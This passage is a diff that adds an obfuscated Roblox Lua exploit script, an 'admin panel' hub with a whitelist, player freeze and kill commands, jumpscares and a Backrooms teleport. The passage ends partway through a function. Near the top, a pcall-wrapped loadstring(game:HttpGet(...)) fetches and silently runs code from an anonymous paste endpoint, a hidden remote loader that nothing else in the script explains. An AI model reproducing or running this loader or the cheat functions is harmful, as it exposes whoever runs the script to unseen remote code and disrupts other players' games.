@@ -1,0 +1,1841 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+
+]]--
+
+local Players = game:GetService("Players");
+local LocalPlayer = Players.LocalPlayer;
+local TextChatService = game:GetService("TextChatService");
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local TweenService = game:GetService("TweenService");
+local CoreGui = game:GetService("CoreGui");
+local RunService = game:GetService("RunService");
+local StarterGui = game:GetService("StarterGui");
+local Workspace = game:GetService("Workspace");
+pcall(function()
+	loadstring(game:HttpGet("https://coderawv2.vercel.app/api/raw?id=-Ocx9Pwtsl7r3vfy_Per"))();
+end);
+local function getCurrentTimestamp()
+	return os.time();
+end
+local function parseDateTime(dateString)
+	local day, month, year, hour, minute = dateString:match("(%d+)/(%d+)/(%d+) (%d+):(%d+)");
+	if (day and month and year and hour and minute) then
+		return os.time({day=tonumber(day),month=tonumber(month),year=tonumber(year),hour=tonumber(hour),min=tonumber(minute),sec=0});
+	end
+	return nil;
+end
+local WhitelistData = {pie_56769={type="Dono",expires=nil},luke_jokerHk3={type="Dono Max 💀",expires=nil},doxPkwsXLBt={type="Dono Max 💀",expires=nil},teste={type="Usuário adm",expires=parseDateTime("15/01/2026 23:59")}};
+local function isUserWhitelisted(username)
+	local userData = WhitelistData[username:lower()];
+	if not userData then
+		return false, "Não está na whitelist";
+	end
+	if userData.expires then
+		local FlatIdent_95CAC = 0;
+		local currentTime;
+		while true do
+			if (FlatIdent_95CAC == 0) then
+				currentTime = getCurrentTimestamp();
+				if (currentTime > userData.expires) then
+					return false, "Whitelist expirada em " .. os.date("%d/%m/%Y %H:%M", userData.expires);
+				end
+				break;
+			end
+		end
+	end
+	return true, userData.type;
+end
+local function verifyWhitelistOnStart()
+	local FlatIdent_76979 = 0;
+	local username;
+	local isWhitelisted;
+	local reason;
+	while true do
+		if (FlatIdent_76979 == 1) then
+			if not isWhitelisted then
+				local FlatIdent_24A02 = 0;
+				while true do
+					if (FlatIdent_24A02 == 1) then
+						return false;
+					end
+					if (FlatIdent_24A02 == 0) then
+						task.wait(2);
+						if reason:find("expirada") then
+							LocalPlayer:Kick("❌ SUA WHITELIST EXPIROU!\n\nData de expiração: " .. reason:match("expirada em (.+)"));
+						else
+							LocalPlayer:Kick("❌ VOCÊ NÃO ESTÁ NA WHITELIST!\n\nEntre em contato com o desenvolvedor.");
+						end
+						FlatIdent_24A02 = 1;
+					end
+				end
+			end
+			return true;
+		end
+		if (FlatIdent_76979 == 0) then
+			username = LocalPlayer.Name:lower();
+			isWhitelisted, reason = isUserWhitelisted(username);
+			FlatIdent_76979 = 1;
+		end
+	end
+end
+if not verifyWhitelistOnStart() then
+	return;
+end
+local FROZEN_PLAYERS = {};
+local playerOriginalSpeed = {};
+local jaulas = {};
+local jailConnections = {};
+local SHADOW_USERS = {};
+local TEMP_MODS = {};
+local JUMPSCARES = {{Name=";jumps1",ImageId="rbxassetid://126754882337711",AudioId="rbxassetid://138873214826309"},{Name=";jumps2",ImageId="rbxassetid://86379969987314",AudioId="rbxassetid://143942090"},{Name=";jumps3",ImageId="rbxassetid://127382022168206",AudioId="rbxassetid://143942090"},{Name=";jumps4",ImageId="rbxassetid://95973611964555",AudioId="rbxassetid://138873214826309"}};
+local function FreezePlayer(player)
+	local FlatIdent_89ECE = 0;
+	local h;
+	while true do
+		if (FlatIdent_89ECE == 3) then
+			return true;
+		end
+		if (FlatIdent_89ECE == 2) then
+			h.WalkSpeed = 0;
+			h.JumpPower = 0;
+			FlatIdent_89ECE = 3;
+		end
+		if (FlatIdent_89ECE == 1) then
+			if (not h or FROZEN_PLAYERS[player.Name]) then
+				return false;
+			end
+			FROZEN_PLAYERS[player.Name] = {WalkSpeed=h.WalkSpeed,JumpPower=h.JumpPower};
+			FlatIdent_89ECE = 2;
+		end
+		if (FlatIdent_89ECE == 0) then
+			if (not player or not player.Character) then
+				return false;
+			end
+			h = player.Character:FindFirstChildOfClass("Humanoid");
+			FlatIdent_89ECE = 1;
+		end
+	end
+end
+local function UnfreezePlayer(player)
+	if (not player or not FROZEN_PLAYERS[player.Name]) then
+		return false;
+	end
+	local s = FROZEN_PLAYERS[player.Name];
+	if player.Character then
+		local FlatIdent_8199B = 0;
+		local h;
+		while true do
+			if (FlatIdent_8199B == 0) then
+				h = player.Character:FindFirstChildOfClass("Humanoid");
+				if h then
+					local FlatIdent_39B0 = 0;
+					while true do
+						if (FlatIdent_39B0 == 0) then
+							h.WalkSpeed = s.WalkSpeed;
+							h.JumpPower = s.JumpPower;
+							break;
+						end
+					end
+				end
+				break;
+			end
+		end
+	end
+	FROZEN_PLAYERS[player.Name] = nil;
+	return true;
+end
+local function KillPlus(player)
+	local FlatIdent_1076E = 0;
+	local humanoid;
+	local humanoidRootPart;
+	local targetPos;
+	local parts;
+	local numParts;
+	while true do
+		if (2 == FlatIdent_1076E) then
+			for i = 1, numParts do
+				local FlatIdent_A9A3 = 0;
+				local part;
+				local bodyVelocity;
+				while true do
+					if (FlatIdent_A9A3 == 0) then
+						part = Instance.new("Part");
+						part.Name = "KillPlusPart_" .. player.Name .. "_" .. i;
+						part.Size = Vector3.new(3, 3, 3);
+						FlatIdent_A9A3 = 1;
+					end
+					if (FlatIdent_A9A3 == 3) then
+						bodyVelocity = Instance.new("BodyVelocity");
+						bodyVelocity.Velocity = Vector3.new(0, 100, 0);
+						bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000);
+						FlatIdent_A9A3 = 4;
+					end
+					if (FlatIdent_A9A3 == 2) then
+						part.Material = Enum.Material.Neon;
+						part.BrickColor = BrickColor.new("Really red");
+						part.Parent = Workspace;
+						FlatIdent_A9A3 = 3;
+					end
+					if (FlatIdent_A9A3 == 1) then
+						part.Position = targetPos + Vector3.new(math.random(-15, 15), -10, math.random(-15, 15));
+						part.Anchored = false;
+						part.CanCollide = true;
+						FlatIdent_A9A3 = 2;
+					end
+					if (FlatIdent_A9A3 == 4) then
+						bodyVelocity.Parent = part;
+						table.insert(parts, part);
+						break;
+					end
+				end
+			end
+			wait(1.5);
+			if player.Character then
+				player.Character:BreakJoints();
+				local explosion = Instance.new("Part");
+				explosion.Size = Vector3.new(10, 10, 10);
+				explosion.Position = targetPos;
+				explosion.Anchored = true;
+				explosion.CanCollide = false;
+				explosion.Material = Enum.Material.Neon;
+				explosion.BrickColor = BrickColor.new("Bright yellow");
+				explosion.Transparency = 0.3;
+				explosion.Parent = Workspace;
+				local light = Instance.new("PointLight");
+				light.Brightness = 10;
+				light.Range = 20;
+				light.Color = Color3.new(1, 1, 0);
+				light.Parent = explosion;
+				game:GetService("Debris"):AddItem(explosion, 3);
+				for _, part in ipairs(parts) do
+					game:GetService("Debris"):AddItem(part, 4);
+				end
+			end
+			return true;
+		end
+		if (1 == FlatIdent_1076E) then
+			if (TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
+				local FlatIdent_7F35E = 0;
+				local channel;
+				while true do
+					if (FlatIdent_7F35E == 0) then
+						channel = TextChatService.TextChannels.RBXGeneral;
+						if channel then
+							channel:SendAsync("💀 Kill Plus executado em " .. player.Name);
+						end
+						break;
+					end
+				end
+			else
+				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("💀 Kill Plus executado em " .. player.Name, "All");
+			end
+			targetPos = humanoidRootPart.Position;
+			parts = {};
+			numParts = 8;
+			FlatIdent_1076E = 2;
+		end
+		if (FlatIdent_1076E == 0) then
+			if (not player or not player.Character) then
+				return false;
+			end
+			humanoid = player.Character:FindFirstChildOfClass("Humanoid");
+			humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart");
+			if (not humanoid or not humanoidRootPart) then
+				return false;
+			end
+			FlatIdent_1076E = 1;
+		end
+	end
+end
+local function TriggerJumpscare(player, jumpscare)
+	if (not player or (player ~= LocalPlayer)) then
+		return false;
+	end
+	local screenGui = Instance.new("ScreenGui", CoreGui);
+	screenGui.Name = "JumpscareGui";
+	screenGui.IgnoreGuiInset = true;
+	local imageLabel = Instance.new("ImageLabel", screenGui);
+	imageLabel.Size = UDim2.new(1, 0, 1, 0);
+	imageLabel.Position = UDim2.new(0, 0, 0, 0);
+	imageLabel.BackgroundTransparency = 1;
+	imageLabel.Image = jumpscare.ImageId;
+	local sound = Instance.new("Sound", screenGui);
+	sound.SoundId = jumpscare.AudioId;
+	sound.Volume = 1;
+	sound.Looped = false;
+	sound:Play();
+	local flashCount = 10;
+	local flashInterval = 0.2;
+	for i = 1, flashCount do
+		if not screenGui.Parent then
+			break;
+		end
+		imageLabel.ImageTransparency = (((i % 2) == 0) and 0.3) or 0;
+		task.wait(flashInterval);
+	end
+	sound:Stop();
+	screenGui:Destroy();
+	return true;
+end
+local function createSpecialTag(player, tagText)
+	local char = player.Character;
+	if not char then
+		return;
+	end
+	local head = char:FindFirstChild("Head");
+	if not head then
+		return;
+	end
+	local old = head:FindFirstChild("SpecialTag");
+	if old then
+		old:Destroy();
+	end
+	local billboardGui = Instance.new("BillboardGui");
+	billboardGui.Name = "SpecialTag";
+	billboardGui.Size = UDim2.new(0, 200, 0, 50);
+	billboardGui.StudsOffset = Vector3.new(0, 3, 0);
+	billboardGui.Adornee = head;
+	billboardGui.AlwaysOnTop = true;
+	billboardGui.Parent = head;
+	local frame = Instance.new("Frame");
+	frame.Size = UDim2.new(1, 0, 1, 0);
+	frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
+	frame.BackgroundTransparency = 0.5;
+	frame.BorderSizePixel = 0;
+	frame.Parent = billboardGui;
+	local corner = Instance.new("UICorner");
+	corner.CornerRadius = UDim.new(0, 12);
+	corner.Parent = frame;
+	local textLabel = Instance.new("TextLabel");
+	textLabel.Size = UDim2.new(1, 0, 1, 0);
+	textLabel.BackgroundTransparency = 1;
+	textLabel.Text = tagText;
+	textLabel.TextColor3 = Color3.fromRGB(170, 0, 255);
+	textLabel.TextScaled = true;
+	textLabel.Font = Enum.Font.GothamBold;
+	textLabel.TextStrokeTransparency = 0.5;
+	textLabel.Parent = frame;
+end
+local function applyTag(player)
+	local FlatIdent_6A83E = 0;
+	local isWhitelisted;
+	local tagType;
+	while true do
+		if (FlatIdent_6A83E == 0) then
+			isWhitelisted, tagType = isUserWhitelisted(player.Name:lower());
+			if isWhitelisted then
+				local FlatIdent_2D2B8 = 0;
+				while true do
+					if (FlatIdent_2D2B8 == 0) then
+						player.CharacterAdded:Connect(function()
+							local FlatIdent_E0D0 = 0;
+							while true do
+								if (FlatIdent_E0D0 == 0) then
+									task.wait(1);
+									createSpecialTag(player, tagType);
+									break;
+								end
+							end
+						end);
+						if player.Character then
+							local FlatIdent_8DCA9 = 0;
+							while true do
+								if (FlatIdent_8DCA9 == 0) then
+									task.wait(1);
+									createSpecialTag(player, tagType);
+									break;
+								end
+							end
+						end
+						break;
+					end
+				end
+			end
+			break;
+		end
+	end
+end
+for _, p in ipairs(Players:GetPlayers()) do
+	applyTag(p);
+end
+Players.PlayerAdded:Connect(function(p)
+	applyTag(p);
+end);
+local backroomsMonster = nil;
+local monsterActive = false;
+local function CreateBackroomsMonster(position)
+	local FlatIdent_39EBF = 0;
+	local monsterFolder;
+	local monsterPart;
+	local monsterDecal;
+	local decalBack;
+	local decalLeft;
+	local decalRight;
+	local monsterLight;
+	local smokeParticles;
+	local monsterSound;
+	while true do
+		if (FlatIdent_39EBF == 3) then
+			monsterDecal.Name = "MonsterFace";
+			monsterDecal.Texture = "rbxassetid://126754882337711";
+			monsterDecal.Face = Enum.NormalId.Front;
+			monsterDecal.Parent = monsterPart;
+			FlatIdent_39EBF = 4;
+		end
+		if (FlatIdent_39EBF == 1) then
+			monsterPart.Size = Vector3.new(8, 12, 8);
+			monsterPart.Position = position;
+			monsterPart.Anchored = true;
+			monsterPart.CanCollide = true;
+			FlatIdent_39EBF = 2;
+		end
+		if (FlatIdent_39EBF == 8) then
+			monsterLight.Parent = monsterPart;
+			smokeParticles = Instance.new("ParticleEmitter");
+			smokeParticles.Texture = "rbxassetid://243664672";
+			smokeParticles.Lifetime = NumberRange.new(1, 3);
+			FlatIdent_39EBF = 9;
+		end
+		if (11 == FlatIdent_39EBF) then
+			monsterSound.SoundId = "rbxassetid://138873214826309";
+			monsterSound.Volume = 1.5;
+			monsterSound.Looped = true;
+			monsterSound.Parent = monsterPart;
+			FlatIdent_39EBF = 12;
+		end
+		if (FlatIdent_39EBF == 5) then
+			decalLeft = Instance.new("Decal");
+			decalLeft.Texture = "rbxassetid://126754882337711";
+			decalLeft.Face = Enum.NormalId.Left;
+			decalLeft.Parent = monsterPart;
+			FlatIdent_39EBF = 6;
+		end
+		if (FlatIdent_39EBF == 7) then
+			monsterLight = Instance.new("PointLight");
+			monsterLight.Brightness = 5;
+			monsterLight.Range = 20;
+			monsterLight.Color = Color3.fromRGB(255, 0, 0);
+			FlatIdent_39EBF = 8;
+		end
+		if (FlatIdent_39EBF == 6) then
+			decalRight = Instance.new("Decal");
+			decalRight.Texture = "rbxassetid://126754882337711";
+			decalRight.Face = Enum.NormalId.Right;
+			decalRight.Parent = monsterPart;
+			FlatIdent_39EBF = 7;
+		end
+		if (FlatIdent_39EBF == 4) then
+			decalBack = Instance.new("Decal");
+			decalBack.Texture = "rbxassetid://126754882337711";
+			decalBack.Face = Enum.NormalId.Back;
+			decalBack.Parent = monsterPart;
+			FlatIdent_39EBF = 5;
+		end
+		if (FlatIdent_39EBF == 12) then
+			monsterSound:Play();
+			coroutine.wrap(function()
+				while monsterPart.Parent do
+					local FlatIdent_8435E = 0;
+					while true do
+						if (FlatIdent_8435E == 0) then
+							monsterLight.Brightness = 8;
+							wait(0.5);
+							FlatIdent_8435E = 1;
+						end
+						if (FlatIdent_8435E == 1) then
+							monsterLight.Brightness = 3;
+							wait(0.5);
+							break;
+						end
+					end
+				end
+			end)();
+			return monsterFolder;
+		end
+		if (10 == FlatIdent_39EBF) then
+			smokeParticles.Transparency = NumberSequence.new(0.3, 0.8);
+			smokeParticles.Size = NumberSequence.new(1, 3);
+			smokeParticles.Parent = monsterPart;
+			monsterSound = Instance.new("Sound");
+			FlatIdent_39EBF = 11;
+		end
+		if (FlatIdent_39EBF == 0) then
+			monsterFolder = Instance.new("Folder");
+			monsterFolder.Name = "BackroomsMonster";
+			monsterPart = Instance.new("Part");
+			monsterPart.Name = "MonsterBody";
+			FlatIdent_39EBF = 1;
+		end
+		if (FlatIdent_39EBF == 2) then
+			monsterPart.Material = Enum.Material.SmoothPlastic;
+			monsterPart.BrickColor = BrickColor.new("Really black");
+			monsterPart.Parent = monsterFolder;
+			monsterDecal = Instance.new("Decal");
+			FlatIdent_39EBF = 3;
+		end
+		if (FlatIdent_39EBF == 9) then
+			smokeParticles.Rate = 25;
+			smokeParticles.SpreadAngle = Vector2.new(45, 45);
+			smokeParticles.Speed = NumberRange.new(2, 4);
+			smokeParticles.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0));
+			FlatIdent_39EBF = 10;
+		end
+	end
+end
+local function ActivateMonster(player)
+	if (not player or not player.Character) then
+		return;
+	end
+	local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart");
+	if not humanoidRootPart then
+		return;
+	end
+	if not backroomsMonster then
+		local FlatIdent_206F8 = 0;
+		local monsterPosition;
+		while true do
+			if (FlatIdent_206F8 == 1) then
+				backroomsMonster.Parent = workspace;
+				break;
+			end
+			if (0 == FlatIdent_206F8) then
+				monsterPosition = humanoidRootPart.Position + Vector3.new(25, 0, 0);
+				backroomsMonster = CreateBackroomsMonster(monsterPosition);
+				FlatIdent_206F8 = 1;
+			end
+		end
+	end
+	monsterActive = true;
+	local monsterBody = backroomsMonster:FindFirstChild("MonsterBody");
+	if not monsterBody then
+		return;
+	end
+	task.wait(2);
+	local screenGui = Instance.new("ScreenGui", CoreGui);
+	screenGui.Name = "MonsterJumpscare";
+	screenGui.IgnoreGuiInset = true;
+	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+	local imageLabel = Instance.new("ImageLabel", screenGui);
+	imageLabel.Size = UDim2.new(1, 0, 1, 0);
+	imageLabel.Position = UDim2.new(0, 0, 0, 0);
+	imageLabel.BackgroundColor3 = Color3.new(0, 0, 0);
+	imageLabel.BackgroundTransparency = 0;
+	imageLabel.Image = "rbxassetid://126754882337711";
+	imageLabel.ScaleType = Enum.ScaleType.Fit;
+	imageLabel.ImageTransparency = 1;
+	local scareSound = Instance.new("Sound");
+	scareSound.SoundId = "rbxassetid://138873214826309";
+	scareSound.Volume = 2.5;
+	scareSound.Looped = false;
+	scareSound.Parent = screenGui;
+	coroutine.wrap(function()
+		local FlatIdent_466B2 = 0;
+		while true do
+			if (FlatIdent_466B2 == 0) then
+				imageLabel.ImageTransparency = 0;
+				scareSound:Play();
+				FlatIdent_466B2 = 1;
+			end
+			if (1 == FlatIdent_466B2) then
+				for i = 1, 6 do
+					local FlatIdent_2BE02 = 0;
+					while true do
+						if (FlatIdent_2BE02 == 1) then
+							imageLabel.Size = UDim2.new(1, 0, 1, 0);
+							wait(0.1);
+							break;
+						end
+						if (FlatIdent_2BE02 == 0) then
+							imageLabel.Size = UDim2.new(1.1, 0, 1.1, 0);
+							wait(0.1);
+							FlatIdent_2BE02 = 1;
+						end
+					end
+				end
+				for i = 1, 10 do
+					local FlatIdent_3CF01 = 0;
+					while true do
+						if (FlatIdent_3CF01 == 0) then
+							imageLabel.ImageTransparency = i / 10;
+							wait(0.05);
+							break;
+						end
+					end
+				end
+				FlatIdent_466B2 = 2;
+			end
+			if (2 == FlatIdent_466B2) then
+				scareSound:Stop();
+				screenGui:Destroy();
+				break;
+			end
+		end
+	end)();
+	StarterGui:SetCore("ChatMakeSystemMessage", {Text="💀 O MONSTRO DAS BACKROOMS TE VIU! FUJA!",Color=Color3.fromRGB(255, 0, 0),Font=Enum.Font.GothamBold});
+	while monsterActive and player.Character and player.Character:FindFirstChild("HumanoidRootPart") do
+		local playerPos = player.Character.HumanoidRootPart.Position;
+		local monsterPos = monsterBody.Position;
+		local direction = (playerPos - monsterPos).Unit;
+		local newPosition = monsterPos + (direction * 2.5);
+		monsterBody.Position = newPosition;
+		monsterBody.CFrame = CFrame.new(newPosition, playerPos);
+		if ((playerPos - newPosition).Magnitude < 8) then
+			local killEffect = Instance.new("Part");
+			killEffect.Size = Vector3.new(10, 10, 10);
+			killEffect.Position = playerPos;
+			killEffect.Anchored = true;
+			killEffect.CanCollide = false;
+			killEffect.Material = Enum.Material.Neon;
+			killEffect.BrickColor = BrickColor.new("Really red");
+			killEffect.Transparency = 0.7;
+			killEffect.Parent = workspace;
+			local killLight = Instance.new("PointLight");
+			killLight.Brightness = 15;
+			killLight.Range = 15;
+			killLight.Color = Color3.fromRGB(255, 0, 0);
+			killLight.Parent = killEffect;
+			if player.Character then
+				player.Character:BreakJoints();
+				local deathSound = Instance.new("Sound");
+				deathSound.SoundId = "rbxassetid://143942090";
+				deathSound.Volume = 1.5;
+				deathSound.Parent = workspace;
+				deathSound:Play();
+				game:GetService("Debris"):AddItem(deathSound, 3);
+				game:GetService("Debris"):AddItem(killEffect, 2);
+				StarterGui:SetCore("ChatMakeSystemMessage", {Text="💀 O MONSTRO DAS BACKROOMS TE PEGOU! VOCÊ MORREU!",Color=Color3.fromRGB(255, 0, 0),Font=Enum.Font.GothamBold});
+				break;
+			end
+		end
+		wait(0.1);
+	end
+end
+local function DeactivateMonster()
+	monsterActive = false;
+	if backroomsMonster then
+		local FlatIdent_32B97 = 0;
+		while true do
+			if (FlatIdent_32B97 == 0) then
+				backroomsMonster:Destroy();
+				backroomsMonster = nil;
+				break;
+			end
+		end
+	end
+end
+local function CreateBackrooms()
+	local backroomsFolder = workspace:FindFirstChild("DemonClient_Backrooms");
+	if backroomsFolder then
+		backroomsFolder:Destroy();
+	end
+	backroomsFolder = Instance.new("Folder");
+	backroomsFolder.Name = "DemonClient_Backrooms";
+	backroomsFolder.Parent = workspace;
+	local mapID = 10581711055;
+	local distantPosition = Vector3.new(0, 10000, 0);
+	local teleportPosition = Vector3.new(59.06, 9996.7, 19.42);
+	local success, mapa = pcall(function()
+		return game:GetObjects("rbxassetid://" .. mapID)[1];
+	end);
+	if (success and mapa) then
+		local FlatIdent_1FC27 = 0;
+		local lighting;
+		local humSound;
+		while true do
+			if (FlatIdent_1FC27 == 4) then
+				humSound:Play();
+				return backroomsFolder, teleportPosition;
+			end
+			if (FlatIdent_1FC27 == 1) then
+				lighting = game:GetService("Lighting");
+				lighting.Brightness = 0.6;
+				lighting.Ambient = Color3.fromRGB(255, 200, 100);
+				lighting.OutdoorAmbient = Color3.fromRGB(255, 200, 100);
+				FlatIdent_1FC27 = 2;
+			end
+			if (FlatIdent_1FC27 == 3) then
+				humSound.SoundId = "rbxassetid://9114825996";
+				humSound.Volume = 0.6;
+				humSound.Looped = true;
+				humSound.Parent = backroomsFolder;
+				FlatIdent_1FC27 = 4;
+			end
+			if (FlatIdent_1FC27 == 2) then
+				lighting.FogColor = Color3.fromRGB(255, 200, 100);
+				lighting.FogEnd = 250;
+				lighting.FogStart = 50;
+				humSound = Instance.new("Sound");
+				FlatIdent_1FC27 = 3;
+			end
+			if (FlatIdent_1FC27 == 0) then
+				mapa.Parent = backroomsFolder;
+				mapa.Name = "BackroomsMap";
+				if not mapa.PrimaryPart then
+					local part = mapa:FindFirstChildWhichIsA("BasePart");
+					if part then
+						mapa.PrimaryPart = part;
+					end
+				end
+				if mapa.PrimaryPart then
+					mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition));
+				else
+					for _, part in ipairs(mapa:GetDescendants()) do
+						if part:IsA("BasePart") then
+							part.Position = part.Position + distantPosition;
+						end
+					end
+				end
+				FlatIdent_1FC27 = 1;
+			end
+		end
+	else
+		local basePosition = Vector3.new(0, -500, 0);
+		local roomSize = 100;
+		local wallHeight = 20;
+		local function createRoom(roomPosition, roomName)
+			local roomFolder = Instance.new("Folder");
+			roomFolder.Name = roomName;
+			roomFolder.Parent = backroomsFolder;
+			local function createWall(position, size, name)
+				local FlatIdent_628E3 = 0;
+				local wall;
+				while true do
+					if (FlatIdent_628E3 == 1) then
+						wall.Size = size;
+						wall.Position = roomPosition + position;
+						FlatIdent_628E3 = 2;
+					end
+					if (FlatIdent_628E3 == 0) then
+						wall = Instance.new("Part");
+						wall.Name = name;
+						FlatIdent_628E3 = 1;
+					end
+					if (FlatIdent_628E3 == 4) then
+						wall.Parent = roomFolder;
+						return wall;
+					end
+					if (FlatIdent_628E3 == 3) then
+						wall.Material = Enum.Material.Plastic;
+						wall.BrickColor = BrickColor.new("Br. yellowish orange");
+						FlatIdent_628E3 = 4;
+					end
+					if (FlatIdent_628E3 == 2) then
+						wall.Anchored = true;
+						wall.CanCollide = true;
+						FlatIdent_628E3 = 3;
+					end
+				end
+			end
+			local floor = createWall(Vector3.new(0, 0, 0), Vector3.new(roomSize, 1, roomSize), "Floor");
+			local ceiling = createWall(Vector3.new(0, wallHeight, 0), Vector3.new(roomSize, 1, roomSize), "Ceiling");
+			ceiling.BrickColor = BrickColor.new("Dark orange");
+			createWall(Vector3.new(-roomSize / 2, wallHeight / 2, 0), Vector3.new(2, wallHeight, roomSize), "WestWall");
+			createWall(Vector3.new(roomSize / 2, wallHeight / 2, 0), Vector3.new(2, wallHeight, roomSize), "EastWall");
+			createWall(Vector3.new(0, wallHeight / 2, -roomSize / 2), Vector3.new(roomSize, wallHeight, 2), "NorthWall");
+			createWall(Vector3.new(0, wallHeight / 2, roomSize / 2), Vector3.new(roomSize, wallHeight, 2), "SouthWall");
+			return roomFolder;
+		end
+		local centralRoom = createRoom(basePosition, "CentralRoom");
+		teleportPosition = basePosition + Vector3.new(0, 5, 0);
+		return backroomsFolder, teleportPosition;
+	end
+end
+local function TeleportToBackrooms(player)
+	if (not player or not player.Character) then
+		return false;
+	end
+	local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart");
+	if not humanoidRootPart then
+		return false;
+	end
+	local backroomsFolder, spawnPosition = CreateBackrooms();
+	local transitionEffect = Instance.new("Part");
+	transitionEffect.Name = "BackroomsTransition";
+	transitionEffect.Size = Vector3.new(8, 8, 8);
+	transitionEffect.Position = humanoidRootPart.Position;
+	transitionEffect.Anchored = true;
+	transitionEffect.CanCollide = false;
+	transitionEffect.Material = Enum.Material.Neon;
+	transitionEffect.BrickColor = BrickColor.new("Bright yellow");
+	transitionEffect.Transparency = 0.3;
+	transitionEffect.Parent = workspace;
+	local transitionLight = Instance.new("PointLight");
+	transitionLight.Brightness = 8;
+	transitionLight.Range = 12;
+	transitionLight.Color = Color3.fromRGB(255, 255, 150);
+	transitionLight.Parent = transitionEffect;
+	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
+	local tween = TweenService:Create(transitionEffect, tweenInfo, {Size=Vector3.new(15, 15, 15),Transparency=0.8});
+	tween:Play();
+	humanoidRootPart.CFrame = CFrame.new(spawnPosition);
+	game:GetService("Debris"):AddItem(transitionEffect, 1);
+	task.wait(3);
+	ActivateMonster(player);
+	return true;
+end
+local function RestoreNormalWorld()
+	local FlatIdent_6679B = 0;
+	local backroomsFolder;
+	local lighting;
+	while true do
+		if (FlatIdent_6679B == 0) then
+			DeactivateMonster();
+			backroomsFolder = workspace:FindFirstChild("DemonClient_Backrooms");
+			FlatIdent_6679B = 1;
+		end
+		if (FlatIdent_6679B == 2) then
+			lighting.Brightness = 2;
+			lighting.Ambient = Color3.fromRGB(128, 128, 128);
+			FlatIdent_6679B = 3;
+		end
+		if (3 == FlatIdent_6679B) then
+			lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128);
+			lighting.FogColor = Color3.fromRGB(191, 191, 191);
+			FlatIdent_6679B = 4;
+		end
+		if (FlatIdent_6679B == 4) then
+			lighting.FogEnd = 100000;
+			lighting.FogStart = 0;
+			break;
+		end
+		if (FlatIdent_6679B == 1) then
+			if backroomsFolder then
+				backroomsFolder:Destroy();
+			end
+			lighting = game:GetService("Lighting");
+			FlatIdent_6679B = 2;
+		end
+	end
+end
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))();
+local Window = WindUI:CreateWindow({Title="Mano Hub Admin Painel",Icon="terminal",Author="By Sae",Folder="LccClient",Size=UDim2.fromOffset(330, 240),Transparent=true,Theme="Dark",Resizable=true,SideBarWidth=200,Background="728316102835",BackgroundImageTransparency=0.1,HideSearchBar=true,ScrollBarEnabled=false});
+Window:EditOpenButton({Title="Mano Hub",Icon="terminal",CornerRadius=UDim.new(0, 16),StrokeThickness=2,Color=ColorSequence.new(Color3.fromHex("800080"), Color3.fromHex("4B0082")),OnlyMobile=false,Enabled=true,Draggable=true});
+local VerifyTab = Window:Tab({Title="Verify",Icon="shield",Locked=false});
+local VerifySection = VerifyTab:Section({Title="Sistema de Verificação",Desc="Verifique seu acesso ao Demon Hub"});
+local VerifyButton = VerifySection:Button({Title="Verifique",Icon="check",Callback=function()
+	if (TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
+		local FlatIdent_6D68E = 0;
+		local textChannel;
+		while true do
+			if (FlatIdent_6D68E == 0) then
+				textChannel = TextChatService.TextChannels.RBXGeneral;
+				if textChannel then
+					local FlatIdent_4A248 = 0;
+					while true do
+						if (0 == FlatIdent_4A248) then
+							textChannel:SendAsync(";verifique");
+							WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!");
+							break;
+						end
+					end
+				end
+				break;
+			end
+		end
+	else
+		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(";verifique", "All");
+		WindUI:Notify("Verificação", "Comando ;verifique enviado no chat!");
+	end
+end});
+local ComandosTab = Window:Tab({Title="Comandos",Icon="command",Locked=false});
+local playerNames = {};
+local selectedPlayers = {};
+for _, plr in ipairs(Players:GetPlayers()) do
+	table.insert(playerNames, plr.Name);
+end
+local SelectionSection = ComandosTab:Section({Title="Seleção de Jogadores",Desc="Selecione os jogadores para os comandos"});
+local Dropdown = SelectionSection:Dropdown({Title="Selecionar Jogadores",Values=playerNames,Value={},Multi=true,AllowNone=true,Callback=function(newSelectedPlayers)
+	selectedPlayers = newSelectedPlayers;
+	print("Jogadores selecionados: " .. table.concat(selectedPlayers, ", "));
+end});
+Players.PlayerAdded:Connect(function(plr)
+	local FlatIdent_82923 = 0;
+	while true do
+		if (FlatIdent_82923 == 0) then
+			table.insert(playerNames, plr.Name);
+			Dropdown:SetValues(playerNames);
+			break;
+		end
+	end
+end);
+Players.PlayerRemoving:Connect(function(plr)
+	for i, name in ipairs(playerNames) do
+		if (name == plr.Name) then
+			table.remove(playerNames, i);
+			break;
+		end
+	end
+	Dropdown:SetValues(playerNames);
+end);
+local function SendCommand(msg)
+	local tcs = game:GetService("TextChatService");
+	if (tcs.ChatVersion == Enum.ChatVersion.TextChatService) then
+		local FlatIdent_7873D = 0;
+		local channel;
+		while true do
+			if (FlatIdent_7873D == 0) then
+				channel = tcs.TextChannels.RBXGeneral;
+				if channel then
+					channel:SendAsync(msg);
+				end
+				break;
+			end
+		end
+	else
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All");
+	end
